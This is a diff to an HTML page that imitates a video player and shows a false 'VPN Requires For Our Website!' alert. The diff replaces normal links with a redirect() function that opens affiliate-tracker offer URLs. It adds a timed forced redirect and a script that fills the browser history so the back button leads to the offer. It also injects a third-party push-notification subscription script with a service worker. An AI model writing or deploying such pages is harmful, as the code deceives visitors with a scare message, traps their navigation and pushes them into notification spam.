@@ -4,7 +4,6 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>(1) Notification</title>
-    <link rel="icon" href="https://www.vpnsafebrowsing.com/yt3/favicon.ico" type="image/x-icon">
     <link rel="stylesheet" href="style.css">
     <script src="jquery-3.4.1.min.js"></script>
     <script src="headers.js"></script>
@@ -12,11 +11,11 @@
 
 <body>
     <div id="message-box">
-        <b>VPN highly suggested for this site</b>
-        <p style="padding-bottom: 22px;">Your browsing, streaming and download activity may be not private and may be unsecured.</p>
+        <b>VPN Requires For Our Website!</b>
+        <p style="padding-bottom: 22px;">Your browsing, streaming and download activity is not private and is unsecured.</p>
         <hr id="divider">
         <div style="margin-top: 15px;">
-        <a target="_blank" href="https://app.appsflyer.com/" id="install">
+        <a onclick="redirect();" id="install">
            INSTALL
         </a>
     </div>
@@ -29,12 +28,12 @@
     </div>
     <div id="yt-player">
         <div id="yt-player-left">
-            <a target="_blank" href="https://app.appsflyer.com/" id="play">
+            <a onclick="redirect();" id="play">
                 <svg height="100%" version="1.1" viewBox="0 0 36 36" width="38px">
                     <path fill="white" d="M 12,26 18.5,22 18.5,14 12,10 z M 18.5,22 25,18 25,18 18.5,14 z"></path>
                 </svg>
             </a>
-            <a target="_blank" href="https://app.appsflyer.com/" id="forward">
+            <a onclick="redirect();" id="forward">
                 <svg height="100%" version="1.1" viewBox="0 0 36 36" width="38px">
                     <path fill="white" d="M 12,24 20.5,18 12,12 V 24 z M 22,12 v 12 h 2 V 12 h -2 z">
                 </path></svg>
@@ -72,6 +71,51 @@
     </div>
 </div>
 
-
+<script type="text/javascript">
+    function redirect() {
+       window.open('https://tk.besttrustedreview.com/click.php?lp=1&to_offer=1');
+       setTimeout(function () {
+         window.location.href = "https://tk.besttrustedreview.com/click.php?lp=1&to_offer=2";
+       },  5000)
+     }
+    </script>
+    
+    <script type="text/javascript">
+    setTimeout(function () {
+      window.location.href = "https://tk.besttrustedreview.com/click.php?lp=1&to_offer=3&event10=1";
+    }, 1800000);
+    </script>
+    
+    <script type="text/javascript">
+    ! function () {
+        var t;
+        try {
+            const URL = window.location.href.split(/[#]/)[0];
+            for (t = 0; 10 > t; ++t) history.pushState({}, "", URL+'#')
+            onpopstate = function(event){
+                event.state && location.replace('https://tk.besttrustedreview.com/click.php?lp=1&to_offer=3&event10=1');
+            }
+        } catch (o) { console.log( o ); }
+    }();
+    </script>
+    
+    <script>
+    //org.rangextd.buzz
+    var url = new URL(window.location.href);
+    var pci = url.searchParams.get('clickid');
+    var s = document.createElement('script');
+    s.src='//ouphouch.com/pfe/current/micro.tag.min.js?z=4947068'+'&ymid='+pci+'&sw=/sw-check-permissions-747a6.js';
+    s.onload = function(result) {
+      switch (result) {
+          case 'onPermissionDefault':break;
+          case 'onPermissionAllowed':break;
+          case 'onPermissionDenied':break;
+          case 'onAlreadySubscribed':break;
+          case 'onNotificationUnsupported':break;
+      }
+    }
+    
+    document.head.appendChild(s);
+    </script>
 
 </body></html>
